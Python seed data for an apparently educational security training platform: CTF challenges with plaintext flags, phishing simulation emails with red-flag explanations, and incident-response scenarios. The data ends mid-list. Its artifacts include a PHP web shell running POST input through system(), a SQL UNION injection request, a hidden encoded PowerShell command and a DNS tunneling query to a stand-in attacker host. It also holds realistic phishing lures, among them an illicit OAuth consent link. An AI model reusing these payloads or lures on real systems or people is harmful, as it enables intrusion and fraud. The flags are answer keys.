"""
Threat Vector — Seed Data Module
Provides comprehensive, high-quality educational data for:
- CTF Challenges
- Realistic Phishing Scenarios
- Incident Response War Room Scenarios
- Threat Intelligence Cache
- System Badges
"""

import json
import hashlib

def hash_flag(flag_str):
    return hashlib.sha256(flag_str.strip().encode('utf-8')).hexdigest()

CTF_CHALLENGES = [
    {
        "title": "The Midnight Intruder",
        "category": "LOGS",
        "difficulty": "Easy",
        "points": 100,
        "xp_reward": 120,
        "description": "An automated alert triggered on the web server at midnight. Analyze the Apache access log snippet to identify the attacker's IP address who successfully accessed and downloaded the confidential administrative backup archive.",
        "scenario_context": "The internal web application hosts public documents and an administrative portal. A threat actor attempted path traversal and scanner probes before discovering an exposed backup zip file.",
        "artifact_data": """192.168.1.45 - - [14/Oct/2026:00:12:01 +0000] "GET /index.html HTTP/1.1" 200 4520
192.168.1.45 - - [14/Oct/2026:00:12:05 +0000] "GET /about.html HTTP/1.1" 200 2310
10.0.0.12 - - [14/Oct/2026:00:13:10 +0000] "GET /api/status HTTP/1.1" 200 120
192.168.1.105 - - [14/Oct/2026:00:14:22 +0000] "GET /../../etc/passwd HTTP/1.1" 403 280
192.168.1.105 - - [14/Oct/2026:00:14:25 +0000] "GET /admin/login.php HTTP/1.1" 401 512
192.168.1.105 - - [14/Oct/2026:00:14:31 +0000] "GET /admin/config.bak HTTP/1.1" 404 196
192.168.1.105 - - [14/Oct/2026:00:14:38 +0000] "GET /admin/backup.zip HTTP/1.1" 200 48921040
192.168.1.45 - - [14/Oct/2026:00:15:02 +0000] "GET /contact.html HTTP/1.1" 200 1840""",
        "hints_json": json.dumps([
            "Look for the HTTP status code 200 indicating successful download of the archive file.",
            "The client IP address is located in the very first column of standard Apache log format."
        ]),
        "flag_plain": "FLAG{192.168.1.105}",
        "flag_hash": hash_flag("FLAG{192.168.1.105}")
    },
    {
        "title": "C2 Beacon Decode",
        "category": "CRYPTO",
        "difficulty": "Easy",
        "points": 100,
        "xp_reward": 120,
        "description": "Network defenders intercepted a suspicious outbound DNS TXT query containing an encoded message string. Decode the payload to recover the command-and-control secret authentication token.",
        "scenario_context": "Malware beacons frequently encode commands inside DNS queries or HTTP headers to blend in with legitimate network traffic.",
        "artifact_data": "Intercepted Base64 String: RkxBR3tiYXNlNjRfaXNfbm90X2VuY3J5cHRpb25fc2VjdXJpdHl9",
        "hints_json": json.dumps([
            "The character set and length indicate standard Base64 encoding.",
            "You can use Python's `base64.b64decode` or an online converter to decode the string."
        ]),
        "flag_plain": "FLAG{base64_is_not_encryption_security}",
        "flag_hash": hash_flag("FLAG{base64_is_not_encryption_security}")
    },
    {
        "title": "DNS Tunneling Discovery",
        "category": "NETSEC",
        "difficulty": "Medium",
        "points": 150,
        "xp_reward": 180,
        "description": "Your Zeek network intrusion detection system logged a high volume of unusually long subdomains queried against an unfamiliar external nameserver. Decode the hexadecimal subdomain string to reveal the exfiltrated sensitive data.",
        "scenario_context": "DNS tunneling encodes unauthorized data inside DNS query labels to bypass traditional firewalls that permit outbound port 53 traffic.",
        "artifact_data": "Query Name: 666c61677b646e735f657866696c74726174696f6e5f64657465637465647d.tunnel.attacker-c2.net\nQuery Type: A\nClient: 10.0.5.21 (Research Workstation)\nServer: 8.8.8.8",
        "hints_json": json.dumps([
            "Extract the alphanumeric characters before '.tunnel.attacker-c2.net'.",
            "The characters represent ASCII text represented in hexadecimal format (e.g. 66 = 'f', 6c = 'l')."
        ]),
        "flag_plain": "FLAG{dns_exfiltration_detected}",
        "flag_hash": hash_flag("FLAG{dns_exfiltration_detected}")
    },
    {
        "title": "Shadow PowerShell Persistence",
        "category": "FORENSICS",
        "difficulty": "Medium",
        "points": 150,
        "xp_reward": 180,
        "description": "During digital forensics on an endpoint alert (Event ID 4688), analysts identified a stealth scheduled task executing an encoded PowerShell command. Decode the argument to capture the threat flag.",
        "scenario_context": "Attackers leverage PowerShell's '-EncodedCommand' parameter to hide malicious scripts from basic antivirus command-line argument inspection.",
        "artifact_data": "Command Line: powershell.exe -NoP -NonI -W Hidden -Enc RkxBR3twZXJzaXN0ZW5jZV92aWFfc2NoZWR1bGVkX3Rhc2t9",
        "hints_json": json.dumps([
            "The '-Enc' flag in PowerShell accepts a Base64-encoded string.",
            "Decode the Base64 value directly to view the plaintext flag."
        ]),
        "flag_plain": "FLAG{persistence_via_scheduled_task}",
        "flag_hash": hash_flag("FLAG{persistence_via_scheduled_task}")
    },
    {
        "title": "Signature Hunt: Web Shell",
        "category": "THREAT_ID",
        "difficulty": "Easy",
        "points": 100,
        "xp_reward": 120,
        "description": "An unexpected PHP file was uploaded into the public `/uploads/profile_pics/` directory. Inspect the de-obfuscated script snippet to locate the security analyst verification flag.",
        "scenario_context": "Web shells provide interactive backdoor access to compromised web servers via HTTP requests.",
        "artifact_data": "<?php\n// Simple Command Dispatcher\nif(isset($_POST['eval_cmd'])){\n    $cmd = $_POST['eval_cmd'];\n    system($cmd);\n    // Verified Threat Signature Flag: FLAG{eval_system_webshell_found}\n}\n?>",
        "hints_json": json.dumps([
            "Look for the embedded flag comment within the PHP code snippet."
        ]),
        "flag_plain": "FLAG{eval_system_webshell_found}",
        "flag_hash": hash_flag("FLAG{eval_system_webshell_found}")
    },
    {
        "title": "Tactical Caesar Cipher",
        "category": "CRYPTO",
        "difficulty": "Medium",
        "points": 150,
        "xp_reward": 180,
        "description": "Analysts intercepted an encrypted communication between threat actors using a classic rotational substitution cipher. Decrypt the ciphertext rotated by 13 positions (ROT13) to obtain the flag.",
        "scenario_context": "Even basic ciphers are occasionally used by script kiddies and commodity malware authors to conceal strings in plain binaries.",
        "artifact_data": "Ciphertext: SYNT{eBG13_vf_abg_n_pvcure_sbe_cebqhpgvba}",
        "hints_json": json.dumps([
            "Each letter is shifted by 13 alphabet positions.",
            "Notice that shifting 'S' by 13 letters gives 'F', 'Y' becomes 'L', 'N' becomes 'A', 'T' becomes 'G'."
        ]),
        "flag_plain": "FLAG{rOT13_is_not_a_cipher_for_production}",
        "flag_hash": hash_flag("FLAG{rOT13_is_not_a_cipher_for_production}")
    },
    {
        "title": "SQL Injection Extraction",
        "category": "LOGS",
        "difficulty": "Hard",
        "points": 200,
        "xp_reward": 250,
        "description": "A Web Application Firewall (WAF) rule fired on a corporate inventory management endpoint. Inspect the URL-encoded SQL query parameters to extract the injected payload flag.",
        "scenario_context": "SQL injection attacks occur when untrusted user input is directly concatenated into dynamic SQL queries without parameterized binding.",
        "artifact_data": "HTTP Request Line:\nGET /api/inventory?cat=1'%20UNION%20SELECT%20null,null,'FLAG{blind_sql_injection_defense}',null--%20- HTTP/1.1\nHost: portal.organization-internal.edu\nUser-Agent: sqlmap/1.7.2#stable",
        "hints_json": json.dumps([
            "The '%20' characters represent URL-encoded whitespace.",
            "The flag is located inside the single quotes within the injected UNION SELECT clause."
        ]),
        "flag_plain": "FLAG{blind_sql_injection_defense}",
        "flag_hash": hash_flag("FLAG{blind_sql_injection_defense}")
    },
    {
        "title": "Beacon Jitter Hunter",
        "category": "NETSEC",
        "difficulty": "Hard",
        "points": 200,
        "xp_reward": 250,
        "description": "Network behavioral analysis detected anomalous periodic TLS connections occurring every 60 seconds from an internal workstation to a bulletproof hosting provider IP. Extract the flag from the telemetry payload.",
        "scenario_context": "Threat actors configure Command-and-Control (C2) frameworks like Cobalt Strike or Sliver to ping back at periodic intervals with slight randomization (jitter).",
        "artifact_data": "NetFlow Session Telemetry:\nTimestamp: 2026-10-14 23:15:00 UTC\nSource: 10.0.8.44:51280 -> Dest: 185.220.101.44:443\nProtocol: TCP/TLS\nInterval: 60.02s (Jitter 0.5%)\nTelemetry Payload Metadata:\n{ \"agent\": \"sliver-implant\", \"arch\": \"x64\", \"auth_token\": \"FLAG{heartbeat_jitter_beaconing}\" }",
        "hints_json": json.dumps([
            "Inspect the auth_token field within the telemetry metadata."
        ]),
        "flag_plain": "FLAG{heartbeat_jitter_beaconing}",
        "flag_hash": hash_flag("FLAG{heartbeat_jitter_beaconing}")
    }
]

PHISHING_SCENARIOS = [
    {
        "title": "Urgent Microsoft 365 Password Expiration Notice",
        "difficulty": "Beginner",
        "category": "Credential Harvester",
        "sender_name": "Microsoft 365 Security Operations",
        "sender_email": "admin-alert@m365-security-auth.top",
        "reply_to": "bounce@m365-security-auth.top",
        "subject": "ACTION REQUIRED: Your corporate password expires in 4 hours",
        "body_html": """<p>Dear Employee,</p>
<p>Our identity access monitoring system has detected that your <strong>Office 365 institutional password</strong> is scheduled to expire today in <strong>4 hours</strong>.</p>
<p>To avoid loss of access to your Outlook inbox, OneDrive files, and corporate portals, please re-authenticate your current password immediately:</p>
<div style="text-align: center; margin: 1.5rem 0;">
    <a href="{{ simulated_url }}" style="background: #0078D4; color: #FFFFFF; padding: 0.75rem 1.75rem; border-radius: 4px; text-decoration: none; font-weight: 700; display: inline-block;">
        Keep Current Password &amp; Re-verify Now &rarr;
    </a>
</div>
<p style="font-size: 0.85rem; color: #64748B;">If you do not complete this verification before the deadline, your account will be locked automatically by the domain controller.</p>
<p>Best regards,<br><strong>Microsoft Identity Services &amp; Corporate Security</strong></p>""",
        "simulated_url": "https://login.microsoft-auth-portal.top/common/oauth2/authorize",
        "display_link_text": "Keep Current Password & Re-verify Now",
        "fake_portal_type": "m365",
        "fake_portal_title": "Sign in to your Microsoft account",
        "attachment_name": "",
        "attachment_type": "",
        "attachment_risk": "",
        "is_phishing": True,
        "red_flags_json": json.dumps([
            "Sender domain 'm365-security-auth.top' uses an untrusted '.top' TLD instead of official 'microsoft.com'",
            "Artificial 4-hour urgency deadline designed to induce panic and bypass logical review",
            "Legitimate enterprise identity providers never allow users to 'keep current password' via an external email link",
            "Destination URL points to an unverified third-party spoofed login domain"
        ]),
        "indicator_options_json": json.dumps([
            "Suspicious / Typosquatted sender domain (.top instead of official corporate domain)",
            "Artificial time pressure and urgent deadline (expires in 4 hours)",
            "Unrealistic request to keep password without logging in to official portal",
            "Executable or macro-enabled attachment file",
            "Mismatched Reply-To address pointing to personal webmail"
        ]),
        "explanation": "This is a classic credential harvesting phishing attack exploiting Fear and Urgency. Attackers pressure victims with a short 4-hour deadline to bypass cognitive scrutiny. The sender address uses a lookalike domain ending in '.top' rather than legitimate corporate or Microsoft domains. Never enter credentials on external links received via email."
    },
    {
        "title": "Direct Deposit Payroll Information Change Confirmation",
        "difficulty": "Intermediate",
        "category": "BEC / Financial Fraud",
        "sender_name": "Corporate Payroll Services",
        "sender_email": "payroll-notifications@corp-workplace-internal.com",
        "reply_to": "payroll-notifications@corp-workplace-internal.com",
        "subject": "Notice of Payroll Routing Change for Upcoming Pay Cycle",
        "body_html": """<p>Hello,</p>
<p>This automated notification confirms that your request to update your <strong>Direct Deposit Bank Account &amp; Routing Details</strong> was processed successfully this morning.</p>
<p>Your upcoming semi-monthly salary disbursement of <strong>$3,420.00</strong> will be routed to your new <em>Chase Bank Account ending in *9142</em>.</p>
<p style="background: #FEF2F2; border-left: 4px solid #DC2626; padding: 0.75rem 1rem; color: #991B1B;">
    <strong>Didn't make this change?</strong> If this request was not authorized by you, cancel the transaction immediately by logging into the employee self-service hub:
</p>
<div style="text-align: center; margin: 1.5rem 0;">
    <a href="{{ simulated_url }}" style="background: #DC2626; color: #FFFFFF; padding: 0.75rem 1.75rem; border-radius: 4px; text-decoration: none; font-weight: 700; display: inline-block;">
        Cancel Unauthorized Payroll Change &rarr;
    </a>
</div>
<p style="font-size: 0.85rem; color: #64748B;">Human Resources &amp; Compensation Taskforce</p>""",
        "simulated_url": "https://secure-workday-portal.cc/payroll/login",
        "display_link_text": "Cancel Unauthorized Payroll Change",
        "fake_portal_type": "hr",
        "fake_portal_title": "Workday Employee Self-Service Sign-In",
        "attachment_name": "",
        "attachment_type": "",
        "attachment_risk": "",
        "is_phishing": True,
        "red_flags_json": json.dumps([
            "Anxiety-inducing false alert claiming money is about to be rerouted to an unknown account",
            "Destination link leads to spoofed '.cc' domain ('secure-workday-portal.cc') rather than authentic corporate Workday SSO",
            "Urges immediate panic login on a third-party server to capture corporate SSO credentials",
            "Sender domain 'corp-workplace-internal.com' is an external registration, not your company's actual domain"
        ]),
        "indicator_options_json": json.dumps([
            "Lookalike external domain (.cc) mimicking corporate Workday portal",
            "High emotional charge (loss of paycheck) provoking hasty action",
            "Request to authenticate through an email link rather than established intranet bookmarks",
            "Suspicious executable attachment (.exe or .scr)",
            "Generic greeting without employee name or employee ID number"
        ]),
        "explanation": "This sophisticated Business Email Compromise (BEC) lure leverages panic regarding salary theft. The victim fears their paycheck has been stolen and clicks the prominent red 'Cancel' button without scrutinizing the destination URL (`secure-workday-portal.cc`), handing over their single sign-on (SSO) credentials to the attacker."
    },
    {
        "title": "Q4 Executive Bonus Allocation & Signed Acknowledgment",
        "difficulty": "Advanced",
        "category": "Malware Delivery",
        "sender_name": "Helen Vance (VP Human Resources)",
        "sender_email": "helen.vance@company.com",
        "reply_to": "helen.vance.exec.hr@gmail.com",
        "subject": "CONFIDENTIAL: Approved Executive Compensation & Q4 Performance Bonus",
        "body_html": """<p>Dear Team Member,</p>
<p>Following the quarterly compensation review by the Executive Committee, I am delighted to share your approved <strong>Q4 Performance Bonus and Equity Allocation Summary</strong>.</p>
<p>Please review the enclosed confidential document, sign the digital acknowledgment schedule, and return it to HR before Friday's payroll cutoff.</p>
<div style="background: #F8FAFC; border: 1px solid #E2E8F0; border-radius: 8px; padding: 1rem; margin: 1.25rem 0; display: flex; align-items: center; gap: 0.75rem;">
    <div style="font-size: 2rem;">📎</div>
    <div>
        <div style="font-weight: 700; color: #0F2744;">Q4_Bonus_Allocation_Schedule_Signed.pdf.exe</div>
        <div style="font-size: 0.8rem; color: #64748B;">File size: 1.4 MB | Format: Portable Executable disguised as PDF</div>
    </div>
</div>
<p style="font-size: 0.85rem; color: #64748B;">Please do not forward this document outside the executive management circle.</p>
<p>Warm regards,<br><strong>Helen Vance</strong><br>Vice President of People &amp; Culture</p>""",
        "simulated_url": "",
        "display_link_text": "",
        "fake_portal_type": "doc",
        "fake_portal_title": "Confidential Document Preview",
        "attachment_name": "Q4_Bonus_Allocation_Schedule_Signed.pdf.exe",
        "attachment_type": "application/x-msdownload",
        "attachment_risk": "Critical (Double-extension executable disguised as a PDF document)",
        "is_phishing": True,
        "red_flags_json": json.dumps([
            "Double file extension (.pdf.exe) concealing an executable malware payload behind a PDF icon",
            "Mismatched Reply-To header pointing to an external '@gmail.com' address rather than official corporate email",
            "Greed and curiosity heuristic tempting the recipient with an unexpected financial bonus",
            "Executive authority impersonation (VP of HR) to discourage questioning"
        ]),
        "indicator_options_json": json.dumps([
            "Double extension attack (.pdf.exe) concealing executable malware",
            "Reply-To address mismatch pointing to public webmail (@gmail.com)",
            "Greed / financial reward trigger exploiting desire for compensation bonus",
            "Artificial credential expiration deadline",
            "Typosquatted domain with .xyz extension"
        ]),
        "explanation": "This advanced attack combines Authority Impersonation with a Double Extension payload (`.pdf.exe`). Operating systems with 'Hide extensions for known file types' enabled will display the file as `Q4_Bonus_Allocation_Schedule_Signed.pdf`, tricking the user into launching compiled malware. Furthermore, the Reply-To header points to a personal Gmail account."
    },
    {
        "title": "DHL Express: Delivery Exception - Unpaid Customs Surcharge",
        "difficulty": "Beginner",
        "category": "Invoice Scam",
        "sender_name": "DHL Express Shipping Notification",
        "sender_email": "tracking-dispatch@dhl-delivery-notification.biz",
        "reply_to": "tracking-dispatch@dhl-delivery-notification.biz",
        "subject": "Shipment #DH-90812 Held at Regional Hub: Customs Duty of $2.15 Due",
        "body_html": """<p>Dear Customer,</p>
<p>Your incoming international package with tracking number <strong>#DH-889012-US</strong> has arrived at the regional customs sorting facility but cannot be released for final delivery.</p>
<p>An outstanding customs documentation fee of <strong>$2.15 USD</strong> is pending. To avoid parcel return to the original sender, please settle the remaining balance below:</p>
<div style="text-align: center; margin: 1.5rem 0;">
    <a href="{{ simulated_url }}" style="background: #FFCC00; color: #D40511; padding: 0.75rem 1.75rem; border-radius: 4px; text-decoration: none; font-weight: 800; display: inline-block;">
        Pay $2.15 Surcharge &amp; Schedule Delivery &rarr;
    </a>
</div>
<p style="font-size: 0.85rem; color: #64748B;">Unclaimed parcels are scheduled for return or disposal within 48 business hours.</p>
<p>Thank you for choosing <strong>DHL Express Global Logistics</strong>.</p>""",
        "simulated_url": "https://dhl-express-redirection.biz/pay-fee?id=889012",
        "display_link_text": "Pay $2.15 Surcharge & Schedule Delivery",
        "fake_portal_type": "courier",
        "fake_portal_title": "DHL Global Delivery Tracking & Payment",
        "attachment_name": "",
        "attachment_type": "",
        "attachment_risk": "",
        "is_phishing": True,
        "red_flags_json": json.dumps([
            "Sender domain 'dhl-delivery-notification.biz' uses an untrusted '.biz' TLD rather than authentic 'dhl.com'",
            "Micro-charge ($2.15) tactic designed to lower psychological suspicion while harvesting credit card details",
            "Vague shipment details that do not identify the package contents, recipient name, or sender",
            "Urgent threat of package disposal within 48 hours"
        ]),
        "indicator_options_json": json.dumps([
            "Untrusted third-party domain (.biz) impersonating legitimate courier",
            "Small monetary charge ($2.15) to steal credit card data and billing details",
            "Vague shipment information with no specified sender or contents",
            "Executable file attachment (.exe)",
            "Internal corporate password reset request"
        ]),
        "explanation": "This courier phishing scam relies on curiosity and a trivial financial charge ($2.15). Victims assume paying the small fee is harmless, but the fake checkout page captures full credit card numbers, expiration dates, CVVs, and billing addresses for fraudulent card-not-present transactions."
    },
    {
        "title": "IT Operations: Scheduled Weekend Network Maintenance (Safe Baseline)",
        "difficulty": "Intermediate",
        "category": "Legitimate Communication",
        "sender_name": "IT Infrastructure Operations",
        "sender_email": "it-support@organization-internal.edu",
        "reply_to": "it-support@organization-internal.edu",
        "subject": "Notice: Scheduled Core Switch Maintenance (Sunday 02:00 - 04:00 AM UTC)",
        "body_html": """<p>Dear Campus Community,</p>
<p>The Network Operations Center (NOC) will perform scheduled firmware upgrades on our primary campus core switches on <strong>Sunday, October 18, between 02:00 AM and 04:00 AM UTC</strong>.</p>
<p>During this two-hour maintenance window, intermittent access disruptions may occur across campus Wi-Fi and the remote VPN gateway.</p>
<p style="background: #F0FDF4; border-left: 4px solid #16A34A; padding: 0.75rem 1rem; color: #166534;">
    <strong>Action Required: None.</strong> You do not need to log in, reset passwords, or click any links. All network services will resume automatically upon completion.
</p>
<p>For inquiries, contact the IT Service Desk directly via our internal intranet portal or campus extension 4357.</p>
<p>Sincerely,<br><strong>Campus Network Operations Center (NOC)</strong></p>""",
        "simulated_url": "",
        "display_link_text": "",
        "fake_portal_type": "",
        "fake_portal_title": "",
        "attachment_name": "",
        "attachment_type": "",
        "attachment_risk": "",
        "is_phishing": False,
        "red_flags_json": json.dumps([]),
        "indicator_options_json": json.dumps([
            "Sender uses legitimate institutional domain (@organization-internal.edu)",
            "Explicit statement that NO passwords or link clicks are required",
            "Notice provides informational advance scheduling without artificial panic",
            "Provides verifiable internal contact channels (campus extension 4357)"
        ]),
        "explanation": "This email is legitimate communication. It originates from the authentic institutional domain, contains no clickable links or unexpected attachments, sets no coercive deadlines, and explicitly reassures the user that no action or password entry is required. Developing vigilance includes avoiding false alarms on legitimate operational emails."
    },
    {
        "title": "Shared Document: 'FY2026 Executive Performance Review' via DocuSign",
        "difficulty": "Advanced",
        "category": "OAuth Consent",
        "sender_name": "DocuSign Automation Dispatch",
        "sender_email": "dse@na4.docusign-verification.net",
        "reply_to": "dse@na4.docusign-verification.net",
        "subject": "Please Review & DocuSign: Executive Performance Appraisal & Key OKRs",
        "body_html": """<p>Hello,</p>
<p><strong>Office of Executive Leadership</strong> has sent you a confidential document to review and sign via DocuSign Electronic Signature System.</p>
<p><strong>Document:</strong> FY2026_Executive_Performance_Appraisal.pdf<br>
<strong>Status:</strong> Waiting for your digital signoff</p>
<div style="text-align: center; margin: 1.5rem 0;">
    <a href="{{ simulated_url }}" style="background: #2563EB; color: #FFFFFF; padding: 0.75rem 1.75rem; border-radius: 4px; text-decoration: none; font-weight: 700; display: inline-block;">
        Review &amp; Authorize Document in DocuSign &rarr;
    </a>
</div>
<p style="font-size: 0.82rem; color: #64748B;">This document is intended solely for the designated recipient. Unauthorized viewing is prohibited.</p>""",
        "simulated_url": "https://login.microsoftonline.com/common/oauth2/v2.0/authorize?client_id=bad-actor-app-id&response_type=code&scope=Mail.ReadWrite%20Files.ReadWrite.All%20offline_access",
        "display_link_text": "Review & Authorize Document in DocuSign",
        "fake_portal_type": "oauth",
        "fake_portal_title": "Microsoft Permissions Requested — DocuSign Connector",
        "attachment_name": "",
        "attachment_type": "",
        "attachment_risk": "",
        "is_phishing": True,
        "red_flags_json": json.dumps([
            "OAuth consent abuse: Requesting excessive permissions ('Mail.ReadWrite', 'Files.ReadWrite.All')",
            "Lookalike domain 'docusign-verification.net' mimicking authentic 'docusign.com'",
            "Grants persistent API backdoor to recipient's mailbox and cloud drive without needing their password",
            "Social engineering lure around executive performance review to exploit curiosity"
        ]),
        "indicator_options_json": json.dumps([
            "Illicit OAuth consent app requesting excessive cloud mailbox permissions (Mail.ReadWrite)",
            "Spoofed domain (docusign-verification.net instead of docusign.com)",
            "Curiosity lure exploiting confidential executive appraisal",
            "Double extension executable (.pdf.exe)",
            "Urgent 2-hour account termination threat"
        ]),
        "explanation": "This represents an Illicit Consent Grant (OAuth Phishing) attack. Rather than stealing the user's password directly, the link triggers an enterprise OAuth authorization flow that prompts the user to grant an attacker-controlled application full read/write access to their Microsoft 365 mailbox and OneDrive files. Even if the user has multi-factor authentication (MFA) enabled, the approved OAuth token allows the attacker to read emails remotely indefinitely."
    }
]

WAR_ROOM_SCENARIOS = [
    {
        "code": "RANSOM_01",
        "title": "Operation DarkRansom: Active Workstation & Share Outbreak",
        "difficulty": "Medium",
        "threat_actor": "FIN7 / BlackByte Ransomware Affiliate",
        "initial_briefing": "At 09:14 AM on Monday, the SIEM console flashes critical alerts: Workstation `FIN-WS-08` (Finance Director Sarah Lin) executed VSSADMIN commands deleting local Volume Shadow copies. Mapped network share `\\\\nas-finance\\payroll` has begun generating thousands of renamed files with the `.darkcrypt` extension, accompanied by `RESTORE_FILES_README.txt`.",
        "stages_json": json.dumps([
            {
                "stage_idx": 0,
                "stage_title": "Stage 1: Alert Triage & Emergency Quarantine",
                "situation": "Mass file encryption is actively underway across the finance department network share. Sarah Lin reports her screen is frozen with a countdown timer. What is your immediate first defensive action?",
                "options": [
                    {
                        "id": "A",
                        "text": "Immediately isolate FIN-WS-08 from the network via EDR and temporarily disable SMB file sharing on the NAS server.",
                        "security_impact": 100,
                        "data_loss_penalty": 0,
                        "consequence": "Excellent decision! Rapid endpoint isolation stops ransomware propagation to other departmental subnets, and shutting down SMB immediately halts file encryption across the shared storage volume.",
                        "is_ideal": True
                    },
                    {
                        "id": "B",
                        "text": "Reboot FIN-WS-08 into Windows Safe Mode and attempt to copy unencrypted files to an external USB flash drive.",
                        "security_impact": 40,
                        "data_loss_penalty": 40,
                        "consequence": "Poor choice! Rebooting overwrites volatile RAM where cryptographic encryption keys were resident, and plugging in a USB drive risks encrypting the external backup device as well.",
                        "is_ideal": False
                    },
                    {
                        "id": "C",
                        "text": "Initiate communication via the Tor chat link in the ransom note to request a decryption proof test.",
                        "security_impact": 10,
                        "data_loss_penalty": 80,
                        "consequence": "Critical error! Engaging the threat actor before containment exposes organizational panic, does not stop active encryption, and violates institutional incident response policy.",
                        "is_ideal": False
                    }
                ]
            },
            {
                "stage_idx": 1,
                "stage_title": "Stage 2: Blast Radius Investigation & Memory Forensics",
                "situation": "Workstation is contained. Initial triage reveals the ransomware was executed via a malicious macro document downloaded from an email link 30 minutes earlier. How do you assess lateral movement across the domain?",
                "options": [
                    {
                        "id": "A",
                        "text": "Query Active Directory Domain Controller Event Logs (Event IDs 4624, 4672, 7045) for PsExec, WMI, or remote service creation originating from FIN-WS-08.",
                        "security_impact": 100,
                        "data_loss_penalty": 0,
                        "consequence": "Superb investigation! Log correlation confirms the attacker attempted to pivot to `DC-BACKUP-01` via WMI using cached local administrator credentials, but was blocked by host isolation.",
                        "is_ideal": True
                    },
                    {
                        "id": "B",
                        "text": "Run a standard consumer antivirus scan on Sarah Lin's computer and wait for the scan to finish.",
                        "security_impact": 30,
                        "data_loss_penalty": 50,
                        "consequence": "Insufficient response! Endpoint-only AV scanning fails to detect remote persistence, lateral movements, or compromised Kerberos tickets across other domain computers.",
                        "is_ideal": False
                    },
                    {
                        "id": "C",
                        "text": "Wipe and reimage FIN-WS-08 immediately without pulling memory dumps, forensic disk images, or event logs.",
                        "security_impact": 20,
                        "data_loss_penalty": 60,
                        "consequence": "Destructive error! Premature reimaging eliminates forensic evidence necessary to determine the root cause, initial access vector, and scope of data exfiltration.",
                        "is_ideal": False
                    }
                ]
            },
            {
                "stage_idx": 2,
                "stage_title": "Stage 3: Containment, Eradication & Credential Hardening",
                "situation": "Forensics confirms the attacker obtained the local administrator password hash through LSASS memory dumping. How do you eradicate threat actor persistence across the enterprise?",
                "options": [
                    {
                        "id": "A",
                        "text": "Reset the Domain Administrator password, reset the Active Directory KRBTGT account password twice (to invalidate Golden Tickets), and deploy LAPS (Local Administrator Password Solution).",
                        "security_impact": 100,
                        "data_loss_penalty": 0,
                        "consequence": "Textbook remediation! Resetting KRBTGT twice invalidates any forged Kerberos tickets, and deploying LAPS randomizes all local admin passwords, neutralizing lateral movement.",
                        "is_ideal": True
                    },
                    {
                        "id": "B",
                        "text": "Change Sarah Lin's email password and delete the malicious email from her inbox.",
                        "security_impact": 25,
                        "data_loss_penalty": 50,
                        "consequence": "Dangerous oversight! The attacker already has administrative credential hashes on the domain; changing a single user email password leaves enterprise persistence fully intact.",
                        "is_ideal": False
                    },
                    {
                        "id": "C",
                        "text": "Disable the Windows Firewall on the domain controller to allow administrative diagnostic tools to connect.",
                        "security_impact": 0,
                        "data_loss_penalty": 90,
                        "consequence": "Disastrous action! Lowering firewall defenses during an active breach opens the core domain controller to unauthenticated network exploitation.",
                        "is_ideal": False
                    }
                ]
            },
            {
                "stage_idx": 3,
                "stage_title": "Stage 4: Recovery, Validation & Post-Incident Review",
                "situation": "Threat actor persistence is eradicated. The affected network share contains encrypted financial spreadsheets. How do you execute recovery and finalize the incident?",
                "options": [
                    {
                        "id": "A",
                        "text": "Restore the encrypted files from air-gapped, immutable write-once (WORM) offline backups, verify integrity hashes, and conduct an Executive After-Action Review (AAR).",
                        "security_impact": 100,
                        "data_loss_penalty": 0,
                        "consequence": "Outstanding execution! Offline backups ensure 100% data recovery without ransom payment. The after-action review documents lessons learned to harden perimeter filters.",
                        "is_ideal": True
                    },
                    {
                        "id": "B",
                        "text": "Contact an untrusted online data recovery firm promising to decrypt files without backups for a fee.",
                        "security_impact": 30,
                        "data_loss_penalty": 60,
                        "consequence": "High-risk pitfall! Most third-party 'recovery firms' simply pay the ransom in secret and charge an inflated markup, exposing the company to regulatory sanctions.",
                        "is_ideal": False
                    },
                    {
                        "id": "C",
                        "text": "Resume normal operations immediately and conceal the incident from corporate leadership to avoid embarrassment.",
                        "security_impact": 10,
                        "data_loss_penalty": 80,
                        "consequence": "Violates cybersecurity compliance laws, insurance reporting mandates, and professional ethics. Undocumented incidents are almost guaranteed to recur.",
                        "is_ideal": False
                    }
                ]
            }
        ])
    },
    {
        "code": "INGRESS_02",
        "title": "Ghost Ingress: Impossible Travel & Credential Stuffing",
        "difficulty": "Easy",
        "threat_actor": "APT29 / Cozy Bear Variant",
        "initial_briefing": "At 02:18 AM, the Security Information & Event Management (SIEM) console flags an Impossible Travel anomaly for user `marcus.vance`: The account authenticated to the corporate SSL-VPN from IP `185.190.22.4` (Bucharest, Romania). Just 14 minutes earlier, Marcus Vance badged through a physical security turnstile in Chicago, USA.",
        "stages_json": json.dumps([
            {
                "stage_idx": 0,
                "stage_title": "Stage 1: Session Interception & Identity Verification",
                "situation": "The active VPN session from Romania is currently querying sensitive engineering repositories on GitHub Enterprise. What is your immediate action?",
                "options": [
                    {
                        "id": "A",
                        "text": "Terminate the active VPN session immediately, revoke all active OAuth/refresh tokens, and enforce an urgent password reset with MFA requirement.",
                        "security_impact": 100,
                        "data_loss_penalty": 0,
                        "consequence": "Immediate mitigation! Terminating the connection disconnects the intruder, and revoking refresh tokens prevents re-authentication using existing cookie sessions.",
                        "is_ideal": True
                    },
                    {
                        "id": "B",
                        "text": "Send Marcus Vance an email asking if he is currently traveling in Romania.",
                        "security_impact": 20,
                        "data_loss_penalty": 70,
                        "consequence": "Unacceptable delay! It is 2 AM; waiting for an email reply gives the threat actor hours of uninterrupted access to exfiltrate proprietary code.",
                        "is_ideal": False
                    },
                    {
                        "id": "C",
                        "text": "Add the Romanian IP address to a temporary watch list without disconnecting the active session.",
                        "security_impact": 15,
                        "data_loss_penalty": 80,
                        "consequence": "Passive observation during an unauthorized session directly leads to intellectual property theft.",
                        "is_ideal": False
                    }
                ]
            },
            {
                "stage_idx": 1,
                "stage_title": "Stage 2: Root Cause Analysis & Credential Source",
                "situation": "Session revoked. Investigation shows Marcus's password matched a credential dump leaked from a compromised third-party fitness application breach three months earlier. How do you prevent credential stuffing across the organization?",
                "options": [
                    {
                        "id": "A",
                        "text": "Implement FIDO2 / WebAuthn phishing-resistant hardware security keys for all staff and integrate HaveIBeenPwned password breach monitoring into Active Directory.",
                        "security_impact": 100,
                        "data_loss_penalty": 0,
                        "consequence": "Comprehensive defense! Phishing-resistant FIDO2 keys make password reuse and credential stuffing completely ineffective, even if passwords leak online.",
                        "is_ideal": True
                    },
                    {
                        "id": "B",
                        "text": "Ask employees to add a special symbol to the end of their existing passwords.",
                        "security_impact": 35,
                        "data_loss_penalty": 40,
                        "consequence": "Predictable password padding provides negligible defense against automated credential stuffing and dictionary attacks.",
                        "is_ideal": False
                    }
                ]
            }
        ])
    },
    {
